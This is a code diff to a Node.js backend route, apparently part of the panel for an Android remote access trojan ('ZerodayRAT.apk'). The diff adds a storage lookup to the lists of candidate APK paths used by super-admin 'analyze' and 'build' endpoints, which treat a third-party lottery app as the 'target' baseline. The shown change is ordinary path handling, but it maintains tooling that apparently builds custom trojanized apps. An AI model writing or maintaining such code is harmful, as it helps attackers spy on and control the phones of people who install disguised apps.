@@ -4,6 +4,7 @@ const path = require("path");
 const fs = require("fs");
 const { execFile } = require("child_process");
 const { requireAuth, requireSuperAdmin } = require("../middleware/auth.middleware");
+const apkStorage = require("../services/apkStorage");
 
 // Only Super Admin can access, analyze, or create custom apps
 router.use(requireAuth, requireSuperAdmin);
@@ -67,6 +68,9 @@ router.post("/analyze", async (req, res) => {
         path.resolve("F:/targetApk", targetFileName),
         path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
         path.resolve(__dirname, "../../../targetApk", targetFileName),
+        // Current distribution build (backend/storage/apk) plus the old static
+        // locations, so the baseline is found regardless of deployment age.
+        ...(apkStorage.resolveApkPath() ? [apkStorage.resolveApkPath()] : []),
         path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
         path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
         path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
@@ -251,6 +255,7 @@ router.post("/build", async (req, res) => {
           path.resolve("F:/targetApk", targetFileName),
           path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
           path.resolve(__dirname, "../../../targetApk", targetFileName),
+          ...(apkStorage.resolveApkPath() ? [apkStorage.resolveApkPath()] : []),
           path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
           path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
           path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
